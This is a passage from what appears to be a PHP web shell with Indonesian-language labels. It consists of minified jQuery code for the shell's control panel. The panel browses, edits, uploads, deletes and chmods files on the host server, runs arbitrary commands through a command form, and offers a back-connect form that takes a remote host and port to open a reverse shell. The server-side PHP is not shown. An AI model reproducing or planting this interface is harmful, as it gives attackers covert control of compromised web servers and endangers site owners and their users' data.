class="form-control border-success" id="xtime" name="xtime" value="'+a.attributes["data-xtime"].value+'" autofocus/><div class="input-group-append"><button class="btn btn-success" type="submit">GO</button></div></div></div></div></form>',s=""}"download"==i?window.open("?act=path&dir="+u.value+"&entry="+m.value+"&opt="+i,"_blank"):"del"==i||"zip"==i||"unzip"==i?(r.modal("show"),r.find(".modal-title").html(i+" /"+m.value),r.find(".modal-body").html('<form method="post" action="?act='+i+'" id="rq'+i+'" class="text-center"><input type="hidden" name="xtype" value="'+f.value+'"/><input type="hidden" name="xname" value="'+m.value+'"/><input type="hidden" name="xpath" value="'+u.value+'"/><div class="alert alert-info mt-n3 mx-n3 rounded-0">Klik proses utk melanjutkan!!</div><button class="btn btn-success" type="submit">Proses!</button></form>'),r.find(".modal-footer").addClass("d-none").removeClass("d-flex justify-content-center"),r.on("hidden.bs.modal",function(t){r.find(".modal-title").html("unknown"),r.find(".modal-body").html("null"),c.value=""})):"edit"==i?(r.modal("show"),r.find(".modal-body").addClass("p-0"),r.find(".modal-title").html("Edit "+f.value.toUpperCase()+": /"+m.value),o("view",u.value,m.value,function(t){var e='<form method="post" action="?act=path&dir='+u.value+"&entry="+m.value+'&opt=edit" id="rqeditfile"><textarea name="xdata" class="form-control rounded-0" style="white-space:pre;background:#2b2f34;" rows="30">'+t+"</textarea>";r.find(".modal-body").html(e),r.find(".modal-footer").removeClass("d-none").addClass("d-flex justify-content-center").html('<button class="btn btn-success text-center" type="submit">Simpan</button></form>'),setTimeout(()=>r.find(".modal-body textarea").focus(),300)}),r.on("hidden.bs.modal",function(t){r.find(".modal-title").html("unknown"),r.find(".modal-body").removeClass("p-0").html("null"),r.find(".modal-footer").addClass("d-none").removeClass("d-flex justify-content-center"),c.value=""})):"view"==i?(r.modal("show"),r.find(".modal-title").html("View "+f.value.toUpperCase()+": /"+m.value),o("view",u.value,m.value,function(t){r.find(".modal-body").attr("style","background:#2b2f34;").addClass("rounded-0").html('<pre class="mb-0">'+t+"</pre>"),r.find(".modal-footer").removeClass("d-none").addClass("d-flex justify-content-center").html('<button type="button" class="btn btn-danger text-center" data-dismiss="modal" aria-label="Close">Tutup</button>')}),r.on("hidden.bs.modal",function(t){r.find(".modal-title").html("unknown"),r.find(".modal-body").attr("style","").removeClass("rounded-0").html("null"),r.find(".modal-footer").addClass("d-none").removeClass("d-flex justify-content-center"),c.value=""})):(r.modal("show"),r.find(".modal-title").html(l),r.find(".modal-body").html(d),r.on("hidden.bs.modal",function(t){r.find(".modal-title").html("unknown"),r.find(".modal-body").html("null"),c.value=""}))}else n("Error","Invalid request!")},!1)}function r(o,i){t.ajax({type:"get",url:"?act=path&dir="+o,timeout:5e3,beforeSend:function(){t("#fileman").html(e),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide()}}).done(function(e,n,r){t("#fileman").html(a.decode(e)),t("form#rqupload,form#rquploader,form#rqmkdir,form#rqchdir,form#rqreadfile").show().find('input[name="xpath"]').val(o),t("div#uploadmethod").attr("data-xpath",o),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o),t("button#fmanager").attr("data-tempdir",o),i(e)}).fail(function(e,a,i){t("#fileman").html(a+", response code: "+e.status),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide(),t("div#uploadmethod").attr("data-xpath",o),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o),t("button#fmanager").attr("data-tempdir",o),n("Error",a+", response code: "+e.status)})}t(document).on("click","a#chdrive",function(n){n.preventDefault();var o=t(n.currentTarget).attr("data-path");t.ajax({type:"get",url:"?act=path&dir="+o,beforeSend:function(){t("body").find("#fileman").html(e),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide()},success:function(e){t("body").find("#fileman").html(a.decode(e)),t("form#rqupload,form#rquploader,form#rqmkdir,form#rqchdir,form#rqreadfile").show().find('input[name="xpath"]').val(o),t("div#uploadmethod").attr("data-xpath",o),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o)}}).done(function(){i(document.querySelectorAll("#showaksi")),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o),t("form#rqcmd").parent().find("#hasilcommand").html("")})}),t(document).on("click","a#chdir",function(e){e.preventDefault();var a=t(e.currentTarget).attr("data-path");t("ol.breadcrumb").addClass("pl-0").css({background:"transparent",padding:"0"}).html('<li class="breadcrumb-item w-100 active">					<form method="post" action="?act=changedir" class="mb-0" id="rqchdir">						<div class="input-group">							<input type="text" name="xpath" class="form-control form-control-sm border-success" value="'+a+'" autofocus></input>							<div class="input-group-append">								<button class="btn btn-success" type="submit">Go</button>							</div>						</div>					</form></li>')}),t("button#fmanager").on("click",function(n){n.preventDefault();var o=t(n.currentTarget).attr("data-tempdir");t.ajax({type:"get",url:"?act=path&dir="+o,beforeSend:function(){t("body").find("#fileman").html(e),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide()},success:function(e){t("body").find("#fileman").html(a.decode(e)),t("form#rqupload,form#rquploader,form#rqmkdir,form#rqchdir,form#rqreadfile").show().find('input[name="xpath"]').val(o),t("div#uploadmethod").attr("data-xpath",o),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o)}}).done(function(){i(document.querySelectorAll("#showaksi")),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o),t("form#rqcmd").parents().find("#hasilcommand").html("")})}),t("button#fmanager").trigger("click"),t('button[data-target="#nav-cmd"]').on("shown.bs.tab",function(e){t("#hasilcommand").hide()}),t('button[data-target="#nav-berkas"]').on("shown.bs.tab",function(e){t("#fberkas").show()}),t('button[data-target="#nav-berkas"]').on("hidden.bs.tab",function(e){t("#fberkas").hide()}),t('button[data-target="#nav-info"]').on("hidden.bs.tab",function(e){t("#nav-info").find("#showinfo").html("")}),t('button[data-target="#nav-info"]').on("shown.bs.tab",function(a){t.ajax({type:"get",url:"?act=info",dataType:"json",beforeSend:function(){t("#nav-info").find("#showinfo").html(e)}}).done(function(e){try{var a=JSON.parse(JSON.stringify(e)),n=t.map(a,function(t,e){return[t]});t("#nav-info").find("#showinfo").html('<blockquote class="blockquote px-3 pt-n3 pb-3 bg-success-rgb rounded">'+n.join("")+"</blockquote>")}catch(o){t("#nav-info").find("#showinfo").html("Error: Gagal menganalisa server!")}})}),t("#fileman").length>0&&(t("#fileman").on("click","a#ffmanager, button#ffmanager",function(e){e.stopPropagation(),r(t(this).attr("data-path"),function(){i(document.querySelectorAll("#showaksi"))})}),t("#fileman").on("click","a#fxmanager",function(e){e.stopPropagation(),r(t(this).attr("data-path"),function(){i(document.querySelectorAll("#showaksi"))})})),t("#showchmod").on("show.bs.modal",function(e){var a=t(e.relatedTarget),n=t(this).find(".modal-body"),o=a.attr("data-xtype"),i=a.attr("data-xname"),r=a.attr("data-xpath"),d=a.attr("data-xperm");n.find('input[name="xtype"]').val(o),n.find('input[name="xname"]').val(i),n.find('input[name="xpath"]').val(r),n.find('input[name="xperm"]').val(d).focus(),n.find('input[id="xname"]').val(i),n.find('label[for="xname"]').css("text-transform","capitalize").html("dir"==o?"Directory":"File")}),t.each(["rqdel","rqzip","rqunzip","rqrename","rqtouch","rqchmod","rqreadfile","rqeditfile","rqnewfile","rqbc"],function(o,i){t(document).on("submit","form#"+i,function(o){o.preventDefault();var r=t(this),d=t("#modalshowaksi");if(r.find('button[type="submit"]').prop("disabled",!0),"rqrename"==i||"rqtouch"==i)r.find('input[readonly="readonly"]').prop("readonly",!1);else if("rqeditfile"==i||"rqnewfile"==i)var l=a.encode(r.find('textarea[name="xdata"]').val());else if("rqbc"==i){var s=r.find('input[name="bhost"]').val(),f=r.find('input[name="bport"]').val();if(r.find('input[name="btype"]').val(),t("body").find("#showbc").remove(),s.length<=0||f.length<=0)return n("Opss!","Server dan port gak boleh dikosongin!"),r.find('button[type="submit"]').prop("disabled",!1),!1}else if("rqreadfile"==i){var m=r.find('input[name="xpath"]').val();if(m.length<1)return n("Opss!","Isi dulu nama filenya pak!"),!1;d.modal("show"),d.find(".modal-title").html("View FILE: "+m),r.find('button[type="submit"]').prop("disabled",!1)}t.ajax({type:"post",url:r.attr("action"),data:"rqeditfile"==i||"rqnewfile"==i?{xdata:l}:r.serialize(),beforeSend:function(){t("rqbc"==i?'<div class="row" id="showbc"><div class="col-12 mb-3">'+e+"</div></div>":e).insertAfter(r)}}).done(function(e){r.parent().find("div.bg-transparent").remove(),r.find('button[type="submit"]').prop("disabled",!1),"rqreadfile"==i?(d.find(".modal-body").html('<pre class="pre-scrollable mb-0">'+e+"</pre>"),d.find(".modal-footer").html("")):"rqbc"==i?t("#showbc div").html('<pre class="pre-scrollable mb-0">'+e+"</pre>"):("rqrename"==i||"rqtouch"==i?r.find('input[readonly="readonly"]').prop("readonly",!0):"rqchmod"==i&&t("body").find("#showchmod").modal("hide"),d.modal("hide"),n("Alert",e));var a=t("#fileman").find("a#ffmanager");a[a.length-1].click(function(t){t.stopPropagation()})})})}),t(document).on("submit","form#rqchdir",function(e){e.preventDefault();var a=t(this),o=a.find('input[name="xpath"]').val();o.length<1?n("Opss!","Isi dulu nama direktorinya pak!"):(a.find('button[type="submit"]').prop("disabled",!0),r(o,function(){var t=document.querySelectorAll("#showaksi");t.length>0?i(t):n("Error","Direktori tidak ada/ tidak berisi file apapun!")}),a.find('button[type="submit"]').prop("disabled",!1))}),t(document).on("submit","form#rqmkdir",function(a){a.preventDefault();var o=t(this),i=o.find('input[name="xdir"]').val();if(i.length<1)n("Error","Isi dulu nama direktorinya pak!");else if("file"==o.find(":selected").val()){var r=t("#modalshowaksi"),d=o.find('input[name="xpath"]').val();r.modal("show"),r.find(".modal-title").text("FileName: "+i),r.find(".modal-body").html('<form method="post" action="?act=path&dir='+d+"&entry="+i+'&opt=newfile" id="rqnewfile"><div class="d-block mb-3"><textarea name="xdata" class="form-control" style="white-space:pre;" rows="20" placeholder="tulis seperlunya..." autofocus></textarea></div><center><button class="btn btn-success text-center" type="submit">Simpan</button></center></form>')}else o.find('button[type="submit"]').prop("disabled",!0),t.ajax({type:"post",url:o.attr("action"),data:o.serialize(),beforeSend:function(){t(e).insertAfter(o)},success:function(e){o.next("span").remove(),o.find('button[type="submit"]').prop("disabled",!1),n("Alert",e);var a=t("#fileman").find("a#ffmanager");a[a.length-1].click(function(t){t.stopPropagation()}),o.next("span#notify").fadeTo(3e3,500).slideUp(500,function(){t(this).slideUp(500)})}})}),t(document).on("click","div#uploadmethod",function(e){e.preventDefault(),t(this).find("select#xtype").on("change",function(){var e=t(this).find(":selected").val();t("file"==e?"#uploadtypefile":"#uploadtypeurl").modal("show")})}),t(document).on("submit","form#rquploader",function(a){a.preventDefault();var o=t(this);o.find('button[type="submit"]').prop("disabled",!0),t.ajax({type:"post",url:o.attr("action"),data:o.serialize(),beforeSend:function(){t(e).insertAfter(o)}}).done(function(e){o[0].reset(),o.parent().find("div.bg-transparent").remove(),o.find('button[type="submit"]').prop("disabled",!1),t("#uploadtypeurl").modal("hide"),n("Alert",e);var a=t("#fileman").find("a#ffmanager");a[a.length-1].click(function(t){t.stopPropagation()})})}),t("form#rqupload").find('input[type="file"]').on("change",function(){t("form#rqupload").submit()}),t(document).on("submit","form#rqupload",function(e){e.preventDefault();var a=t(this),o=a.find('input[name="xfile[]"]').prop("files");if(o&&o.length<=0||o.size<1)n("Error","File kosong, gak ada isinya!");else{var i=new FormData(this);a.find('button[type="submit"]').prop("disabled",!0),i.append("xfile",o),t.ajax({type:"post",url:a.attr("action"),data:i,dataType:"text",contentType:!1,processData:!1,beforeSend:function(){a.next("span").remove()},success:function(e){a[0].reset(),a.next("span").remove(),a.find('button[type="submit"]').prop("disabled",!1),n("Alert",e),t("#uploadtypefile").modal("hide");var o=t("#fileman").find("a#ffmanager");o[o.length-1].click(function(t){t.stopPropagation()})}})}}),t(document).on("submit","form#rqcmd",function(n){n.preventDefault();var o=t(this);o.parents().find("#hasilcommand").show(),o.find('button[type="submit"]').prop("disabled",!0),t.ajax({type:"post",url:o.attr("action"),data:o.serialize(),dataType:"json",beforeSend:function(){o.parents().find("#hasilcommand").html(e)},success:function(t){var e=JSON.parse(JSON.stringify(t));o.find('input[name="xpath"]').val(a.decode(e.path)),o.find('button[type="submit"]').prop("disabled",!1),o.parents().find("#hasilcommand").html('<div class="card mb-3"><div class="card-body p-2 font-weight-light">'+a.decode(e.stdout)+"</div></div>")},error:function(t,e,a){o.find('button[type="submit"]').prop("disabled",!1),o.parents().find("#hasilcommand").html('<div class="card mb-3"><div class="card-body p-2 font-weight-light">'+e+": "+a+"</div></div>")}}).done(function(e){var n=JSON.parse(JSON.stringify(e));t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile,form#rqbc").find('input[name="xpath"]').val(a.decode(n.path)),t("div#uploadmethod").attr("data-xpath",a.decode(n.path)),t.each(t("button[data-tempdir]"),function(e,o){t(o).attr("data-tempdir",a.decode(n.path))}),t.each(t("a#fxmanager"),function(e,o){t(o).attr("data-path",a.decode(n.path))})})}),t(document).on("hidden.bs.modal",function(){t(".container").attr("style","filter: blur(0px);")}),t(document).on("show.bs.modal",function(){t(".container").attr("style","filter: blur(2px);")})}(jQuery);</script>
 	</body>
 </html>
 <?php }?>
